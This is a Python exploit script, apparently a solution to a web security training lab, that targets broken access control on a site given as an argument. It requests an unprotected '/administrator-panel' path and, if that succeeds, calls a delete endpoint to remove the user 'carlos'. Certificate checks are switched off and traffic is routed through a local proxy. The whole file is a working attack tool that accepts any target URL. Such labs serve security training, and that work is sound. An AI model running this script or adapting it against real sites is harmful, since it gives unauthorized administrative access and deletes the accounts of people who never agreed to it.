import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def delete_user(admin_panel_url):
    delete_url = admin_panel_url + "/delete?username=carlos"
    print("(+) Deleting user carlos")
    r = requests.get(delete_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(+) User carlos deleted successfully.")

    else:
        print("(-) Failed to delete user carlos.")
        sys.exit(-1)


def broken_access_control_exploit(url):
    admin_pnel_url = url + "/administrator-panel"
    r = requests.get(admin_pnel_url, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(+) Exploit Successful.\n")
        delete_user(admin_pnel_url)

    else:
        print("(-) Exploit Failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Starting the Exploit : Broken Acces Control - Unprotected admin functionality \n")
    broken_access_control_exploit(url)


if __name__ == "__main__":
    main()